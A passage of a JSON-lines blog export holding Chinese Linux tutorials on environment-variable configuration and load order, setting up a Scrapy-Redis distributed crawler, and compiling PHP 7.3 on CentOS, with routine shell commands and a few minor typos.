</p>\n\n<p>然后重启网络服务，能正常联网了！</p>\n                                    </div>", "log_PostTime": 1584891244, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Linux环境变量说明与配置", "log_Intro": "Linux环境变量说明与配置", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>相关的配置文件说明：</h3>\n\n<p><br>\n　　/etc/profile<br>\n　　　　范围：对所有用户生效<br>\n　　　　作用：<br>\n　　　　　　a.定义USER变量<br>\n　　　　　　b.定义LOGNAME变量<br>\n　　　　　　c.定义MAIL变量<br>\n　　　　　　d.定义PATH变量<br>\n　　　　　　e.定义HOSTNAME变量<br>\n　　　　　　f.定义HISTSIZE变量<br>\n　　　　　　g.定义umask值<br>\n　　　　　　i.调用/etc/profile.d/*.sh文件<br><br>\n　　/etc/profile.d/*.sh<br>\n　　　　范围：对所有用户生效<br>\n　　　　说明：这是一族sh文件，没个都会被调用<br>\n　　　　例如：<br>\n　　　　　　/etc/profile.d/lang.sh<br>\n　　　　　　作用：调用/etc/sysconfg/i18n设置语言环境<br><br><br>\n　　~/.bash_profile<br>\n　　　　范围：用户自己的家目录，对自己生效<br>\n　　　　作用：<br>\n　　　　　　a.调用 ~/.bashrc文件<br>\n　　　　　　b.在PATH变量后加入了\":$HOME/bin\"这个目录<br><br>\n　　~/.bashrc<br>\n　　　　范围：用户自己的家目录，对自己生效<br>\n　　　　作用:<br>\n　　　　　　a.定义alias别名<br>\n　　　　　　b.调用/etc/bashrc<br><br>\n　　/etc/bashrc<br>\n　　　　范围：对所有用户生效<br>\n　　　　作用:<br>\n　　　　　　a.定义PS1变量(登录以后的提示符样式)<br>\n　　　　　　b.如果是无密码登录，则<br>\n　　　　　　　　定义umask值<br>\n　　　　　　　　定义PATH变量<br>\n　　　　　　　　调用/etc/profile.d/*.sh文件</p>\n\n<p><br><br>\n退出相关的配置文件：<br>\n　　~/.bash_logout<br>\n　　　　范围：用户自己的家目录，对自己生效<br>\n　　　　作用：<br>\n　　　　　　a.默认是空的，什么都没有<br>\n　　　　　　b.可以自己实现在退出的时候要干什么<br><br><br>\n修改配置文件后，使其生效的方法：<br>\n　　a.重新登录<br>\n　　b.使用命令<br>\n　　　　source 配置文件 或 . 配置文件<br>\n　　c.可以认为 . 是 source 命令的缩写</p>\n\n<h3><strong>Linux环境变量配置</strong></h3>\n\n<p>在自定义安装软件的时候，经常需要配置环境变量，下面列举出各种对环境变量的配置方法。</p>\n\n<p>下面所有例子的环境说明如下：</p>\n\n<ul><li>系统：Ubuntu 14.0</li>\n\t<li>用户名：uusama</li>\n\t<li>需要配置MySQL环境变量路径：/home/uusama/mysql/bin</li>\n</ul><p><strong>Linux读取环境变量</strong></p>\n\n<p>读取环境变量的方法：</p>\n\n<ul><li>export命令显示当前系统定义的所有环境变量</li>\n\t<li>echo $PATH命令输出当前的PATH环境变量的值</li>\n</ul><p>这两个命令执行的效果如下</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">uusama@ubuntu:~$ export\n\ndeclare -x HOME=\"/home/uusama\"\n\ndeclare -x LANG=\"en_US.UTF-8\"\n\ndeclare -x LANGUAGE=\"en_US:\"\n\ndeclare -x LESSCLOSE=\"/usr/bin/lesspipe %s %s\"\n\ndeclare -x LESSOPEN=\"| /usr/bin/lesspipe %s\"\n\ndeclare -x LOGNAME=\"uusama\"\n\ndeclare -x MAIL=\"/var/mail/uusama\"\n\ndeclare -x PATH=\"/home/uusama/bin:/home/uusama/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\n\ndeclare -x SSH_TTY=\"/dev/pts/0\"\n\ndeclare -x TERM=\"xterm\"\n\ndeclare -x USER=\"uusama\"\n\n\n\nuusama@ubuntu:~$ echo $PATH\n\n/home/uusama/bin:/home/uusama/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre>\n\n<p> </p>\n\n<p>其中PATH变量定义了运行命令的查找路径，以冒号:分割不同的路径，使用export定义的时候可加双引号也可不加。</p>\n\n<p><strong>Linux环境变量配置方法一：export PATH</strong></p>\n\n<p>使用export命令直接修改PATH的值，配置MySQL进入环境变量的方法:</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">export PATH=/home/uusama/mysql/bin:$PATH\n\n\n\n# 或者把PATH放在前面\n\nexport PATH=$PATH:/home/uusama/mysql/bin</code></pre>\n\n<p><br>\n生效时间：立即生效<strong>注意事项：</strong></p>\n\n<ul><li>生效期限：当前终端有效，窗口关闭后无效</li>\n\t<li>生效范围：仅对当前用户有效</li>\n\t<li>配置的环境变量中不要忘了加上原来的配置，即$PATH部分，避免覆盖原来配置</li>\n</ul><p><strong>Linux环境变量配置方法二：vim ~/.bashrc</strong></p>\n\n<p>通过修改用户目录下的~/.bashrc文件进行配置：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">vim ~/.bashrc\n\n\n\n# 在最后一行加上\n\nexport PATH=$PATH:/home/uusama/mysql/bin</code></pre>\n\n<p><br>\n生效时间：使用相同的用户打开新的终端时生效，或者手动<code>source ~/.bashrc</code>生效<strong>注意事项：</strong></p>\n\n<ul><li>生效期限：永久有效</li>\n\t<li>生效范围：仅对当前用户有效</li>\n\t<li>如果有后续的环境变量加载文件覆盖了PATH定义，则可能不生效</li>\n</ul><p><strong>Linux环境变量配置方法三：vim ~/.bash_profile</strong></p>\n\n<p>和修改~/.bashrc文件类似，也是要在文件最后加上新的路径即可：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">vim ~/.bash_profile\n\n\n\n# 在最后一行加上\n\nexport PATH=$PATH:/home/uusama/mysql/bin</code></pre>\n\n<p><br>\n生效时间：使用相同的用户打开新的终端时生效，或者手动source ~/.bash_profile生效<strong>注意事项：</strong></p>\n\n<ul><li>生效期限：永久有效</li>\n\t<li>生效范围：仅对当前用户有效</li>\n\t<li>如果没有~/.bash_profile文件，则可以编辑~/.profile文件或者新建一个</li>\n</ul><p><strong>Linux环境变量配置方法四：vim /etc/bashrc</strong></p>\n\n<p>该方法是修改系统配置，需要管理员权限（如root）或者对该文件的写入权限：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\"># 如果/etc/bashrc文件不可编辑，需要修改为可编辑\n\nchmod -v u+w /etc/bashrc\n\n\n\nvim /etc/bashrc\n\n\n\n# 在最后一行加上\n\nexport PATH=$PATH:/home/uusama/mysql/bin</code></pre>\n\n<p><br>\n生效时间：新开终端生效，或者手动source /etc/bashrc生效<strong>注意事项：</strong></p>\n\n<ul><li>生效期限：永久有效</li>\n\t<li>生效范围：对所有用户有效</li>\n</ul><p><strong>Linux环境变量配置方法五：vim /etc/profile</strong></p>\n\n<p>该方法修改系统配置，需要管理员权限或者对该文件的写入权限，和<code>vim /etc/bashrc</code>类似：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\"># 如果/etc/profile文件不可编辑，需要修改为可编辑\n\nchmod -v u+w /etc/profile\n\n\n\nvim /etc/profile\n\n\n\n# 在最后一行加上\n\nexport PATH=$PATH:/home/uusama/mysql/bin</code></pre>\n\n<p><br>\n生效时间：新开终端生效，或者手动source /etc/profile生效<strong>注意事项：</strong></p>\n\n<ul><li>生效期限：永久有效</li>\n\t<li>生效范围：对所有用户有效</li>\n</ul><p><strong>Linux环境变量配置方法六：vim /etc/environment</strong></p>\n\n<p>该方法是修改系统环境配置文件，需要管理员权限或者对该文件的写入权限：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\"># 如果/etc/bashrc文件不可编辑，需要修改为可编辑\n\nchmod -v u+w /etc/environment\n\n\n\nvim /etc/profile\n\n\n\n# 在最后一行加上\n\nexport PATH=$PATH:/home/uusama/mysql/bin</code></pre>\n\n<p><br>\n生效时间：新开终端生效，或者手动source /etc/environment生效<strong>注意事项：</strong></p>\n\n<ul><li>生效期限：永久有效</li>\n\t<li>生效范围：对所有用户有效</li>\n</ul><p><strong>Linux环境变量加载原理解析</strong></p>\n\n<p>上面列出了环境变量的各种配置方法，那么Linux是如何加载这些配置的呢？是以什么样的顺序加载的呢？</p>\n\n<p>特定的加载顺序会导致相同名称的环境变量定义被覆盖或者不生效。</p>\n\n<p><strong>环境变量的分类</strong></p>\n\n<p>环境变量可以简单的分成用户自定义的环境变量以及系统级别的环境变量。</p>\n\n<ul><li>用户级别环境变量定义文件：~/.bashrc、~/.bash_profile</li>\n\t<li>系统级别环境变量定义文件：/etc/bashrc、/etc/bash_profile、/etc/environment</li>\n</ul><p>另外在用户环境变量中，系统会首先读取~/.bash_profile文件，如果没有该文件则读取~/.bash_login，如果也没有该文件，则读取~/.profile，根据这些文件中内容再去读取~/.bashrc。</p>\n\n<p><strong>测试Linux环境变量加载顺序的方法</strong></p>\n\n<p>为了测试各个不同文件的环境变量加载顺序，我们在每个环境变量定义文件中的第一行都定义相同的环境变量UU_ORDER，该变量的值为本身的值连接上当前文件名称。</p>\n\n<p>需要修改的文件如下：</p>\n\n<ul><li>/etc/environment</li>\n\t<li>/etc/profile</li>\n\t<li>/etc/profile.d/test.sh，新建文件，没有文件夹可略过</li>\n\t<li>/etc/bashrc，或者/etc/bash.bashrc</li>\n\t<li>~/.bash_profile，或者~/.profile</li>\n\t<li>~/.bashrc</li>\n</ul><p>在每个文件中的第一行都加上下面这句代码，并相应的把冒号后的内容修改为当前文件的绝对文件名。</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">export UU_ORDER=\"$UU_ORDER:~/.bash_profile\"</code></pre>\n\n<p><br>\n修改完之后保存，新开一个窗口，然后<code>echo $UU_ORDER</code>观察变量的值：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">uusama@ubuntu:~$ echo $UU_ORDER\n\n$UU_ORDER:/etc/environment:/etc/profile:/etc/bash.bashrc:/etc/profile.d/test.sh:~/.profile:~/.bashrc</code></pre>\n\n<p><br>\n/etc/environment可以推测出Linux加载环境变量的顺序如下：</p>\n\n<ul><li>/etc/profile</li>\n\t<li>/etc/bash.bashrc</li>\n\t<li>/etc/profile.d/test.sh</li>\n\t<li>~/.profile</li>\n\t<li>~/.bashrc</li>\n</ul><p><strong>Linux环境变量文件加载详解</strong></p>\n\n<p>由上面的测试可容易得出Linux加载环境变量的顺序如下，：</p>\n\n<p>系统环境变量 -&gt; 用户自定义环境变量</p>\n\n<p><code>/etc/environment -&gt; /etc/profile -&gt; ~/.profile</code></p>\n\n<p>打开/etc/profile文件你会发现，该文件的代码中会加载/etc/bash.bashrc文件，然后检查/etc/profile.d/目录下的.sh文件并加载。</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\"># /etc/profile: system-wide .profile file for the Bourne shell (sh(1))\n\n# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).\n\n\n\nif [ \"$PS1\" ]; then\n\n if [ \"$BASH\" ] &amp;&amp; [ \"$BASH\" != \"/bin/sh\" ]; then\n\n # The file bash.bashrc already sets the default PS1.\n\n # PS1='\\h:\\w\\$ '\n\n if [ -f /etc/bash.bashrc ]; then\n\n . /etc/bash.bashrc\n\n fi\n\n else\n\n if [ \"`id -u`\" -eq 0 ]; then\n\n PS1='# '\n\n else\n\n PS1='$ '\n\n fi\n\n fi\n\nfi\n\n\n\nif [ -d /etc/profile.d ]; then\n\n for i in /etc/profile.d/*.sh; do\n\n if [ -r $i ]; then\n\n . $i\n\n fi\n\n done\n\n unset i\n\nfi</code></pre>\n\n<p><br>\n其次再打开~/.profile文件，会发现该文件中加载了~/.bashrc文件。</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\"># if running bash\n\nif [ -n \"$BASH_VERSION\" ]; then\n\n # include .bashrc if it exists\n\n if [ -f \"$HOME/.bashrc\" ]; then\n\n . \"$HOME/.bashrc\"\n\n fi\n\nfi\n\n\n\n# set PATH so it includes user's private bin directories\n\nPATH=\"$HOME/bin:$HOME/.local/bin:$PATH\"</code></pre>\n\n<p><br><strong>一些小技巧</strong>从~/.profile文件中代码不难发现，/.profile文件只在用户登录的时候读取一次，而/.bashrc会在每次运行Shell脚本的时候读取一次。</p>\n\n<p>可以自定义一个环境变量文件，比如在某个项目下定义<code>uusama.profile</code>，在这个文件中使用export定义一系列变量，然后在~/.profile文件后面加上：<code>sourc uusama.profile</code>，这样你每次登陆都可以在Shell脚本中使用自己定义的一系列变量。</p>\n\n<p>也可以使用alias命令定义一些命令的别名，比如<code>alias rm=\"rm -i\"</code> （双引号必须），并把这个代码加入到~/.profile中，这样你每次使用rm命令的时候，都相当于使用rm -i命令，非常方便。</p>\n\n<p><strong>总结</strong></p>\n\n<p>以上就是这篇文章的全部内容了，希望本文的内容对大家的学习或者工作具有一定的参考学习价值，谢谢大家对本博客的支持。</p>\n                                    </div>", "log_PostTime": 1584891245, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:从零搭建Redis-Scrapy分布式爬虫", "log_Intro": "Python:从零搭建Redis-Scrapy分布式爬虫", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191130230559801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>Scrapy-Redis分布式策略：</p>\n\n<p>假设有四台电脑：Windows 10、Mac OS X、Ubuntu 16.04、CentOS 7.2，任意一台电脑都可以作为 Master端 或 Slaver端，比如：</p>\n\n<ul><li>\n\t<p><code>Master端</code>(核心服务器) ：使用 Windows 10，搭建一个Redis数据库，不负责爬取，只负责url指纹判重、Request的分配，以及数据的存储</p>\n\t</li>\n\t<li>\n\t<p><code>Slaver端</code>(爬虫程序执行端) ：使用 Mac OS X 、Ubuntu 16.04、CentOS 7.2，负责执行爬虫程序，运行过程中提交新的Request给Master</p>\n\t</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191130230614206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<ol><li>\n\t<p>首先Slaver端从Master端拿任务（Request、url）进行数据抓取，Slaver抓取数据的同时，产生新任务的Request便提交给 Master 处理；</p>\n\t</li>\n\t<li>\n\t<p>Master端只有一个Redis数据库，负责将未处理的Request去重和任务分配，将处理后的Request加入待爬队列，并且存储爬取的数据。</p>\n\t</li>\n</ol><p>Scrapy-Redis默认使用的就是这种策略，我们实现起来很简单，因为任务调度等工作Scrapy-Redis都已经帮我们做好了，我们只需要继承RedisSpider、指定redis_key就行了。</p>\n\n<p>缺点是，Scrapy-Redis调度的任务是Request对象，里面信息量比较大（不仅包含url，还有callback函数、headers等信息），可能导致的结果就是会降低爬虫速度、而且会占用Redis大量的存储空间，所以如果要保证效率，那么就需要一定硬件水平。</p>\n\n<h2 id=\"一、安装redis\">一、安装Redis</h2>\n\n<p>安装Redis：<a href=\"http://redis.io/download\" rel=\"nofollow\">http://redis.io/download</a></p>\n\n<p>安装完成后，拷贝一份Redis安装目录下的redis.conf到任意目录，建议保存到：<code>/etc/redis/redis.conf</code>（Windows系统可以无需变动)</p>\n\n<h2 id=\"二、修改配置文件-redisconf\">二、修改配置文件 redis.conf</h2>\n\n<p>打开你的redis.conf配置文件，示例:</p>\n\n<ul><li>\n\t<p>非Windows系统: <code>sudo vi /etc/redis/redis.conf</code></p>\n\t</li>\n\t<li>\n\t<p>Windows系统：<code>C:\\Intel\\Redis\\conf\\redis.conf</code></p>\n\t</li>\n</ul><ol><li>\n\t<p>Master端redis.conf里注释<code>bind 127.0.0.1</code>，Slave端才能远程连接到Master端的Redis数据库。</p>\n\t</li>\n</ol><p><img alt=\"\" class=\"has\" height=\"156\" src=\"https://img-blog.csdnimg.cn/20191130230638630.png\" width=\"1200\"></p>\n\n<ol><li>\n\t<ul><li>\n\t\t<p><code>daemonize yno</code>表示Redis默认不作为守护进程运行，即在运行<code>redis-server /etc/redis/redis.conf</code>时，将显示Redis启动提示画面；</p>\n\n\t\t<ul><li><code>daemonize yes</code>则默认后台运行，不必重新启动新的终端窗口执行其他命令，看个人喜好和实际需要。</li>\n\t\t</ul><p> </p>\n\t\t</li>\n\t</ul></li>\n</ol><p><img alt=\"\" class=\"has\" height=\"142\" src=\"https://img-blog.csdnimg.cn/20191130230654229.png\" width=\"1200\"></p>\n\n<h2 id=\"三、测试slave端远程连接master端\">三、测试Slave端远程连接Master端</h2>\n\n<p>测试中，Master端Windows 10 的IP地址为：<code>192.168.199.108</code></p>\n\n<ol><li>\n\t<p>Master端按指定配置文件启动 <code>redis-server</code>，示例：</p>\n\n\t<ul><li>\n\t\t<p>非Windows系统：<code>sudo redis-server /etc/redis/redis/conf</code></p>\n\t\t</li>\n\t\t<li>\n\t\t<p>Windows系统：<code>命令提示符(管理员)</code>模式下执行 <code>redis-server C:\\Intel\\Redis\\conf\\redis.conf</code>读取默认配置即可。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>Master端启动本地<code>redis-cli</code>：</p>\n\t</li>\n</ol><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191130230720586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<ol><li>\n\t<p>slave端启动<code>redis-cli -h 192.168.199.108</code>，-h 参数表示连接到指定主机的redis数据库</p>\n\t</li>\n</ol><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191130230745871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191130230803348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<ol><li>\n\t<p> </p>\n\t</li>\n</ol><p>注意：Slave端无需启动<code>redis-server</code>，Master端启动即可。只要 Slave 端读取到了 Master 端的 Redis 数据库，则表示能够连接成功，可以实施分布式。</p>\n\n<h2 id=\"四、redis数据库桌面管理工具\">四、Redis数据库桌面管理工具</h2>\n\n<p>这里推荐 Redis Desktop Manager，支持 Windows、Mac OS X、Linux 等平台：</p>\n\n<blockquote>\n<p>下载地址：<a href=\"https://redisdesktop.com/download\" rel=\"nofollow\">https://redisdesktop.com/download</a></p>\n</blockquote>\n\n<p> </p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019113023082643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> <img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191130230843833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n                                    </div>", "log_PostTime": 1584891246, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "阿里云centos7.6安装php7.3的详细教程", "log_Intro": "阿里云centos7.6安装php7.3的详细教程", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>本篇文章给大家带来的内容是关于阿里云centos7.6安装php7.3的详细教程，有一定的参考价值，有需要的朋友可以参考一下，希望对你有所帮助。</p>\n\n<p> </p>\n\n<h3>新增用户 用户组</h3>\n\n<pre class=\"has\">\n<code class=\"language-bash\">groupadd www\n\nuseradd -g www www</code></pre>\n\n<p> \n</p><h3><br>\n下载 php</h3>\n\n\n<pre class=\"has\">\n<code>wget \"https://downloads.php.net/~cmb/php-7.3.0.tar.gz\"\n\ntar xzvf php-7.3.0.tar.gz\n\ncd  php-7.3.0</code></pre>\n\n<h3><br><span style=\"color:#4d4d4d;font-size:16px;font-weight:400;\">--with-fpm-user=www --with-fpm-group=www</span>编译</h3>\n\n<p>这里使用www www 用户、用户组<br>\n编译出来的程序启动，就是归属这个用户、用户组</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">./configure --prefix=/usr/local/php --with-fpm-user=www --with-fpm-group=www --with-curl --with-freetype-dir --with-gd --with-gettext --with-iconv-dir --with-kerberos --with-libdir=lib64 --with-libxml-dir --with-mysqli --with-openssl --with-pcre-regex --with-pdo-mysql --with-pdo-sqlite --with-pear --with-png-dir --with-jpeg-dir --with-xmlrpc --with-xsl --with-zlib --with-bz2 --with-mhash --enable-fpm --enable-bcmath --enable-libxml --enable-inline-optimization --enable-mbregex --enable-mbstring --enable-opcache --enable-pcntl --enable-shmop --enable-soap --enable-sockets --enable-sysvsem --enable-sysvshm --enable-xml --enable-zip --enable-fpm</code></pre>\n\n<h3><br><span style=\"color:#4d4d4d;font-size:16px;font-weight:400;\">configure: error: libxml2 not found. Please check your libxml2 installation.</span>编译错误,解决依赖</h3>\n\n<pre class=\"has\">\n<code>yum install -y  libxml2-devel</code></pre>\n\n<p> \n</p><p>configure: error: Please reinstall the BZip2 distribution</p>\n\n\n<pre class=\"has\">\n<code>\t\nyum install -y  bzip2-devel</code></pre>\n\n<p> \n</p><p>configure: error: cURL version 7.15.5 or later is required to compile php with cURL support</p>\n\n\n<pre class=\"has\">\n<code>yum install -y  curl-devel</code></pre>\n\n<p> \n</p><p>configure: error: jpeglib.h not found.</p>\n\n\n<pre class=\"has\">\n<code>yum install -y  libjpeg-devel</code></pre>\n\n<p> \n</p><p>configure: error: png.h not found.</p>\n\n\n<pre class=\"has\">\n<code>yum install -y libpng-devel</code></pre>\n\n<p> \n</p><p>configure: error: freetype-config not found.</p>\n\n\n<pre class=\"has\">\n<code>yum install -y libpng-devel</code></pre>\n\n<p> \n</p><p>configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution</p>\n\n\n<pre class=\"has\">\n<code>yum install -y libxslt-devel</code></pre>\n\n<p> \n</p><p>configure: error: Please reinstall the libzip distribution</p>\n\n\n<pre class=\"has\">\n<code>yum install -y libzip-devel</code></pre>\n\n<p> \n</p><pre class=\"has\">\n<code>#先删除旧版本\n\nyum remove -y libzip\n\n\n\n#下载编译安装\n\nwget https://nih.at/libzip/libzip-1.2.0.tar.gz\n\ntar -zxvf libzip-1.2.0.tar.gz\n\ncd libzip-1.2.0\n\n./configure\n\nmake &amp;&amp; make install</code></pre>\n\n\n<p> \n</p><p>checking for libzip... configure: error: system libzip must be upgraded to version &gt;= 0.11</p>\n\n\n<p>off_t undefined 报错</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>checking libzip... yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>the location of zlib... /usr</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>pkg-config... (cached) /usr/bin/pkg-config</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>libzip... in </code><code>default</code> <code>path: found in /usr/local</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>zip_open in -lzip... yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>zip_file_set_encryption in -lzip... yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>zip_libzip_version in -lzip... no</code></p>\n\n\t\t\t<p><code>checking stdbool.h usability... yes</code></p>\n\n\t\t\t<p><code>checking stdbool.h presence... yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>stdbool.h... yes</code></p>\n\n\t\t\t<p><code>checking fts.h usability... yes</code></p>\n\n\t\t\t<p><code>checking fts.h presence... yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>fts.h... yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>int8_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>int16_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>int32_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>int64_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>uint8_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>uint16_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>uint32_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>uint64_t... (cached) yes</code></p>\n\n\t\t\t<p><code>checking </code><code>for</code> <code>ssize_t... yes</code></p>\n\n\t\t\t<p><code>checking size of short... (cached) 2</code></p>\n\n\t\t\t<p><code>checking size of int... (cached) 4</code></p>\n\n\t\t\t<p><code>checking size of long... (cached) 8</code></p>\n\n\t\t\t<p><code>checking size of long long... (cached) 8</code></p>\n\n\t\t\t<p><code>checking size of off_t... 0</code></p>\n\n\t\t\t<p><code>configure: error: off_t undefined; check your library configuration</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>off_t 类型是在 头文件 unistd.h中定义的，<br>\n在32位系统 编程成 long int ，64位系统则编译成 long long int ，<br>\n在进行编译的时候 是默认查找64位的动态链接库，<br>\n但是默认情况下 centos 的动态链接库配置文件/etc/ld.so.conf里并没有加入搜索路径，<br>\n这个时候需要将 /usr/local/lib64 /usr/lib64 这些针对64位的库文件路径加进去。</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>#添加搜索路径到配置文件</code></p>\n\n\t\t\t<p><code>echo</code> <code>'/usr/local/lib64</code></p>\n\n\t\t\t<p><code>/usr/local/lib</code></p>\n\n\t\t\t<p><code>/usr/lib</code></p>\n\n\t\t\t<p><code>/usr/lib64'&gt;&gt;/etc/ld.so.conf</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>#然后 更新配置</code></p>\n\n\t\t\t<p><code>ldconfig -v</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><h3>安装</h3>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>make &amp;&amp; make install</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>报错<br>\nusr/local/include/zip.h:59:21: fatal error: zipconf.h: No such file or directory</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>cp /usr/local/lib/libzip/</code><code>include</code><code>/zipconf.h /usr/local/</code><code>include</code><code>/zipconf.h</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>成功输出</p>\n\n<table border=\"0\" cellpadding=\"0\" 